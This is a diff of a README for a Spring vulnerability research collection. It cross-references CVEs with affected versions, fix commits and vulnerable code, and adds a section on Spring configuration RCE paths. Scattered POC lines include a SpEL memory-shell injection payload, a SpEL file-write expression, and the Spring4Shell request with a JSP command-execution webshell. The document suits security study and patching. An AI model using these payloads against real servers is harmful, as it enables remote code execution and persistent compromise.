@@ -23,6 +23,7 @@ A list for Spring Security
 | Spring Framework | CVE-2020-5421 | Reflected File Download |
 | Spring Framework | CVE-2022-22965 | RCE |
 | Spring Framework | CVE-2013-4152 | XXE |
+| Spring Framework | SpringConfigTest | RCE |
 | Spring Integration Zip | CVE-2018-1261 | Arbitrary File Write |
 
 ## Programming Environment Setup
@@ -41,8 +42,18 @@ Sring Cloud correspond to Springboot versions: https://spring.io/projects/spring
     </properties>
 ```
 
-## （1）Spring Cloud Function
-### CVE-2022-22979 DoS
+## Some Problems in Spring Config
+Spring OXM —— XStreamMarshaller —— XStream RCE
+
+Hibernate-Validator —— @Valid + buildConstraintViolationWithTemplate —— EL RCE
+
+Http-Invoker —— HttpInvokerServiceExporter —— Deserialization RCE
+
+Ref: https://github.com/ax1sX/SpringSecurity/tree/main/SpringConfigTest
+
+## Vulnerabilities
+### （1）Spring Cloud Function
+#### CVE-2022-22979 DoS
 Affected Version: < 3.2.6
 
 Ref: https://checkmarx.com/blog/spring-function-cloud-dos-cve-2022-22979-and-unintended-function-invocation/
@@ -72,7 +83,7 @@ public <T> void register(FunctionRegistration<T> registration) {
     this.functionRegistrations.add(registration); //将funtion注册在funtionRegistrations中，它是CopyOnWriteArraySet类型，随着size无限增大造成DoS
 }
 ```
-### CVE-2022-22963 SpEL
+#### CVE-2022-22963 SpEL
 Affected Version: <= 3.1.6, 3.2.2
 
 POC: 
@@ -126,8 +137,8 @@ T(java.nio.file.Files).write(T(java.nio.file.Paths).get(T(java.net.URI).create("
 #{T(org.springframework.cglib.core.ReflectUtils).defineClass('Memshell',T(org.springframework.util.Base64Utils).decodeFromString('yv66vgAAA....'),new javax.management.loading.MLet(new java.net.URL[0],T(java.lang.Thread).currentThread().getContextClassLoader())).doInject()}
 ```
 
-## （2）Spring Cloud Gateway
-### CVE-2022-22947 RCE
+### （2）Spring Cloud Gateway
+#### CVE-2022-22947 RCE
 Affected Version: < 3.1.1 or < 3.0.7
 
 Ref: 
@@ -242,8 +253,8 @@ static Object getValue(SpelExpressionParser parser, BeanFactory beanFactory, Str
     return value;
 }
 ```
-## （3）Spring Data Commons
-### CVE-2018-1259 XXE
+### （3）Spring Data Commons
+#### CVE-2018-1259 XXE
 Affected Version: < 1.13.12 or < 2.0.7 + XMLBeam <= 1.4.14
 
 Diff: https://github.com/SvenEwald/xmlbeam/commit/f8e943f44961c14cf1316deb56280f7878702ee1
@@ -275,7 +286,7 @@ private Document readDocument() throws IOException {
 }
 ```
 
-### CVE-2018-1273 SpEL
+#### CVE-2018-1273 SpEL
 Affected Version: < 1.13.11 or < 2.0.6
 
 Diff: https://github.com/spring-projects/spring-data-commons/commit/b1a20ae1e82a63f99b3afc6f2aaedb3bf4dc432a
@@ -307,8 +318,8 @@ public void setPropertyValue(String propertyName, @Nullable Object value) throws
     }
 }
 ```
-## （4）Spring Data Rest
-### CVE-2017-8046 SpEL
+### （4）Spring Data Rest
+#### CVE-2017-8046 SpEL
 Affected Version: < 2.5.12 or 2.6.7 or 3.0 RC3
 
 Diff: https://github.com/spring-projects/spring-data-rest/commit/8f269e28fe8038a6c60f31a1c36cfda04795ab45
@@ -334,9 +345,9 @@ protected void setValueOnTarget(Object target, Object value) {
     this.spelExpression.setValue(target, value);
 }
 ```
-## （5）Spring Security
+### （5）Spring Security
 
-### CVE-2022-22978 Authorization Bypass
+#### CVE-2022-22978 Authorization Bypass
 Affected Version: < 5.5.6, 5.6.3, earlier
 
 Official description: 
@@ -369,7 +380,7 @@ request.getPathInfo()：/Servlet Path/ or Null
 ```
 Summary: `.` in regular matches do not handle `\n`,`\r`
 
-### CVE-2016-4977 OAuth2 SpEL
+#### CVE-2016-4977 OAuth2 SpEL
 Affected Version: < 2.0.0-2.0.9 or 1.0.0-1.0.5
 
 Diff: https://github.com/spring-attic/spring-security-oauth/commit/fff77d3fea477b566bcacfbfc95f85821a2bdc2d
@@ -395,7 +406,7 @@ SpelView
     }
 ```
 
-### CVE-2018-1260 OAuth2 SpEL
+#### CVE-2018-1260 OAuth2 SpEL
 Affected Version: < 2.3.3 or 2.2.2 or 2.1.2 or 2.0.15
 
 Ref: https://www.gosecure.net/blog/2018/05/17/beware-of-the-magic-spell-part-2-cve-2018-1260/
@@ -422,8 +433,8 @@ org.springframework.security.oauth2.provider.endpoin.SpelView
     }
 ```
 
-## （6）Spring Cloud Netflix Hystrix Dashboard 
-### CVE-2021-22053 SpEL
+### （6）Spring Cloud Netflix Hystrix Dashboard 
+#### CVE-2021-22053 SpEL
 Affected Version: < 2.2.9.RELEASE + Spring Boot Thymeleaf
 
 POC: 
@@ -451,7 +462,7 @@ static IStandardExpression parseExpression(IExpressionContext context, String in
 }
 ```
 
-### CVE-2020-5412 SSRF
+#### CVE-2020-5412 SSRF
 Affected Version: <  2.2.4 or 2.1.6
 
 Diff: https://github.com/spring-cloud/spring-cloud-netflix/commit/624bbc8b50f7b5b6a1addc62040e4f2587f24f1b
@@ -479,8 +490,8 @@ protected void doGet(HttpServletRequest request, HttpServletResponse response) t
 }
 ```
 
-## （7）Spring Boot Actuator Logview
-### CVE-2021-21234 Directory Traversal 
+### （7）Spring Boot Actuator Logview
+#### CVE-2021-21234 Directory Traversal 
 Affected Version: < 0.2.13
 
 POC: 
@@ -494,8 +505,8 @@ public void streamContent(Path folder, String filename, OutputStream stream) thr
     IOUtils.copy(new FileInputStream(this.getFile(folder, filename)), stream);
 }
 ```
-## （8）Spring Framework
-### CVE-2018-1270 RCE
+### （8）Spring Framework
+#### CVE-2018-1270 RCE
 Affected Version: < 5.0.5 or 4.3.15
 
 Diff: https://github.com/spring-projects/spring-framework/commit/e0de9126ed8cf25cf141d3e66420da94e350708a#
@@ -524,7 +535,7 @@ private MultiValueMap<String, String> filterSubscriptions(MultiValueMap<String, 
 }
 ```
 
-### CVE-2020-5398 Reflected File Download
+#### CVE-2020-5398 Reflected File Download
 Affected Version: < 5.2.3 or 5.1.13 or 5.0.16
 
 Diff: hhttps://github.com/spring-projects/spring-framework/commit/956ffe68587c8d5f21135b5ce4650af0c2dea933
@@ -573,7 +584,7 @@ if (this.filename != null) {
 }
 ```
 
-### CVE-2020-5421 Reflected File Download
+#### CVE-2020-5421 Reflected File Download
 Affected Version: < 5.2.8 or 5.1.17 or 5.0.18 or 4.3.28 Bypass CVE-2015-5211
 
 Diff: https://github.com/spring-projects/spring-framework/commit/2281e421915627792a88acb64d0fea51ad138092
@@ -613,7 +624,7 @@ private String removeJsessionid(String requestUri) {
 }
 ```
 
-### CVE-2013-4152
+#### CVE-2013-4152
 Affected Version: Spring Framework before 3.2.4 and 4.0.0.M1 using the JAXB marshaller
 
 POC:
@@ -627,7 +638,7 @@ POC:
 ```
 
 
-### CVE-2022-22965
+#### CVE-2022-22965
 Affected Version: 5.3.0 to 5.3.17, 5.2.0 to 5.2.19, and older versions
 
 Ref: https://www.jianshu.com/p/e0c7a03e40d2
@@ -639,8 +650,8 @@ POST /SpringRCEDemo_war_exploded/hello?name=admin&age=2&Class.module.classLoader
 cmd: <%=Runtime.getRuntime().exec(request.getParameter("cmd"))%>
 ```
 
-## （9）Spring Integration Zip
-### CVE-2018-1261 Arbitrary File Write
+### （9）Spring Integration Zip
+#### CVE-2018-1261 Arbitrary File Write
 Affected Version: < 1.0.1
 
 Diff: https://github.com/spring-projects/spring-integration-extensions/commit/d10f537283d90eabd28af57ac97f860a3913bf9b#diff-990b7a04b25d4c5b7cb46f536ac149b0
@@ -693,9 +704,10 @@ protected Object doZipTransform(final Message<?> message) throws Exception {
 }
 ```
 
-## （10）Spring Cloud Config
+### （10）Spring Cloud Config
 CVE-2019-3799、CVE-2020-5405、CVE-2020-5410类似，可复用同一环境，更改Spring Cloud Config版本即可
-### CVE-2019-3799 Directory Traversal
+
+#### CVE-2019-3799 Directory Traversal
 Affected Version: < 2.1.2 or 2.0.4 or 1.4.6
 
 Diff: https://github.com/spring-cloud/spring-cloud-config/commit/3632fc6f64e567286c42c5a2f1b8142bfde505c2
@@ -756,7 +768,7 @@ public synchronized Resource findOne(String application, String profile, String 
     }
 }
 ```
-### CVE-2020-5405 Directory Traversal
+#### CVE-2020-5405 Directory Traversal
 Affected Version: < 2.2.2 or 2.1.7
 
 Diff: https://github.com/spring-cloud/spring-cloud-config/commit/651f458919c40ef9a5e93e7d76bf98575910fad0
@@ -808,7 +820,7 @@ private String resolveLabel(String label) {
 }
 ```
 
-### CVE-2020-5410 Directory Traversal
+#### CVE-2020-5410 Directory Traversal
 Affected Version: < 2.2.2 or 2.1.7
 
 Diff: https://github.com/spring-cloud/spring-cloud-config/commit/1c01d11b74ca08d04e89d935f4cafe1bd0e57c3c
